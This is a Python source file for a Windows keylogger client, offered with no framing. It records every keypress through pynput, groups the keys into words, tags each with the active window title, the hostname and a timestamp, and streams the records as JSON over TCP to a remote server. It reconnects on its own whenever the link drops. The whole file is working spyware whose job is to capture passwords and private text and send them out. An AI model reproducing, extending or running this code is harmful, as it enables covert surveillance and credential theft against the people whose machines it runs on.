import socket
import json
import threading
from pynput import keyboard
import time
from datetime import datetime
import win32gui

from config import server_config


def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "Unknown"


class KeyloggerClient:
    def __init__(self):
        self.server_host = server_config.SERVER_IP
        self.server_port = server_config.SERVER_HOST
        self.view_id = socket.gethostname()
        self.sock = None
        self.word_buffer = ""

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server_host, self.server_port))

            init_msg = json.dumps({"type": "keylogger"}) + "\n"
            self.sock.sendall(init_msg.encode())

            print("[+] Connected")
            return True
        except:
            print("[!] Retry in 3s...")
            time.sleep(3)
            return False

    def ensure_connection(self):
        while self.sock is None:
            self.connect()

    def send_keystroke(self, key_data, window_title):
        try:
            msg = {
                "KeyData": key_data,
                "WindowTitle": window_title,
                "ViewID": self.view_id,
                "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            self.sock.sendall((json.dumps(msg) + "\n").encode())
        except:
            self.sock = None
            self.ensure_connection()

    def flush_word_buffer(self):
        if self.word_buffer != "":
            self.send_keystroke(self.word_buffer, get_active_window_title())
            self.word_buffer = ""

    def on_press(self, key):
        try:
            window_title = get_active_window_title()

            if hasattr(key, "char") and key.char:
                if key.char.isalnum():
                    self.word_buffer += key.char
                else:
                    self.flush_word_buffer()
                    self.send_keystroke(key.char, window_title)

            else:
                self.flush_word_buffer()

                if key == keyboard.Key.space:
                    self.send_keystroke("[SPACE]", window_title)
                elif key == keyboard.Key.enter:
                    self.send_keystroke("[ENTER]", window_title)
                elif key == keyboard.Key.backspace:
                    self.send_keystroke("[BACKSPACE]", window_title)
                else:
                    self.send_keystroke(str(key), window_title)

        except Exception as e:
            print("[-] Error:", e)

    def start(self):
        print("[*] Starting keylogger...")
        self.ensure_connection()

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        while True:
            time.sleep(1)


if __name__ == "__main__":
    KeyloggerClient().start()
